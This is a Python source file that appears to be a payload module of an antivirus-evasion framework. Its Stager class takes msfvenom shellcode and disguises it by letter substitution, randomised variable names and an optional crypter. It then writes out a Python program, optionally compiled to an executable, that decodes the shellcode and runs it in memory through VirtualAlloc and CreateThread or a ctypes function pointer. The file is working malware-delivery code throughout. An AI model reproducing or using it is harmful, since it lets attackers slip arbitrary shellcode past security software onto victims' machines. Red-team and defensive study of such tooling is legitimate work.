"""

Currently, this code takes normal shellcode, and replaces the a hex character with a random non hex letter.  At runtime,
the executables reverses the letter substitution and executes the shellcode

Letter substitution code was adapted from:
http://www.tutorialspoint.com/python/string_maketrans.htm
module by @christruncer
contributed to by @EdvardHolst

"""

from Crypto.Cipher import DES
import string, random

from modules.common import shellcode
from modules.common import messages
from modules.common import randomizer
from modules.common import crypters
from modules.common import encryption

class Stager:
	
	def __init__(self):
		# required options
		self.shortname = "LetterSubstitution"
		self.description = "A letter used in shellcode is replaced with a different letter. At runtime, the exe reverses the letter substitution and executes the shellcode"
		self.language = "python"
		self.rating = "Excellent"
		self.extension = "py"
		
		self.shellcode = shellcode.Shellcode()
		# options we require user interaction for- format is {Option : [Value, Description]]}
		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
						"use_pyherion" : ["N", "Use the pyherion encrypter"],
						"inject_method" : ["virtual", "[virtual]alloc or [void]pointer"]}
	
	def generate(self):
		#Random letter substition variables
		hex_letters = "abcdef"
		non_hex_letters = "ghijklmnopqrstuvwxyz"
		encode_with_this = random.choice(hex_letters)
		decode_with_this = random.choice(non_hex_letters)

		# Generate Shellcode Using msfvenom
		Shellcode = self.shellcode.generate()

		# Generate Random Variable Names
		subbed_shellcode_variable_name = randomizer.randomString()
		shellcode_variable_name = randomizer.randomString()
		rand_ptr = randomizer.randomString()
		rand_buf = randomizer.randomString()
		rand_ht = randomizer.randomString()
		rand_decoded_letter = randomizer.randomString()
		rand_correct_letter = randomizer.randomString()
		rand_sub_scheme = randomizer.randomString()

		# Create Letter Substitution Scheme
		sub_scheme = string.maketrans(encode_with_this, decode_with_this)

		# Escaping Shellcode
		Shellcode = Shellcode.encode("string_escape")

		if self.required_options["inject_method"][0].lower() == "virtual":

			# Create Payload File
			payload_code = 'import ctypes\n'
			payload_code += 'from string import maketrans\n'
			payload_code += rand_decoded_letter + ' = "%s"\n' % decode_with_this
			payload_code += rand_correct_letter + ' = "%s"\n' % encode_with_this
			payload_code += rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
			payload_code += subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
			payload_code += subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
			payload_code += shellcode_variable_name + ' = bytearray(' + subbed_shellcode_variable_name + '.decode(\"string_escape\"))\n'
			payload_code += rand_ptr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + shellcode_variable_name + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
			payload_code += rand_buf + ' = (ctypes.c_char * len(' + shellcode_variable_name + ')).from_buffer(' + shellcode_variable_name + ')\n'
			payload_code += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + rand_ptr + '),' + rand_buf + ',ctypes.c_int(len(' + shellcode_variable_name + ')))\n'
			payload_code += rand_ht + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + rand_ptr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
			payload_code += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + rand_ht + '),ctypes.c_int(-1))\n'

			if self.required_options["use_pyherion"][0].lower() == "y":
				payload_code = crypters.pyherion(payload_code)
			
			return payload_code

		else:
			
			#Additional random variable names
			rand_reverse_shell = randomizer.randomString()
			rand_memory_shell = randomizer.randomString()
			rand_shellcode = randomizer.randomString()

			# Create Payload File
			payload_code = 'from ctypes import *\n'
			payload_code += 'from string import maketrans\n'
			payload_code += rand_decoded_letter + ' = "%s"\n' % decode_with_this
			payload_code += rand_correct_letter + ' = "%s"\n' % encode_with_this
			payload_code += rand_sub_scheme + ' = maketrans('+ rand_decoded_letter +', '+ rand_correct_letter + ')\n'
			payload_code += subbed_shellcode_variable_name + ' = \"'+ Shellcode.translate(sub_scheme) +'\"\n'
			payload_code += subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.translate(' + rand_sub_scheme + ')\n'
			payload_code += subbed_shellcode_variable_name + ' = ' + subbed_shellcode_variable_name + '.decode(\"string_escape\")\n'
			payload_code += rand_memory_shell + ' = create_string_buffer(' + subbed_shellcode_variable_name + ', len(' + subbed_shellcode_variable_name + '))\n'
			payload_code += rand_shellcode + ' = cast(' + rand_memory_shell + ', CFUNCTYPE(c_void_p))\n'
			payload_code += rand_shellcode + '()'
    
			if self.required_options["use_pyherion"][0].lower() == "y":
				payload_code = crypters.pyherion(payload_code)

			return payload_code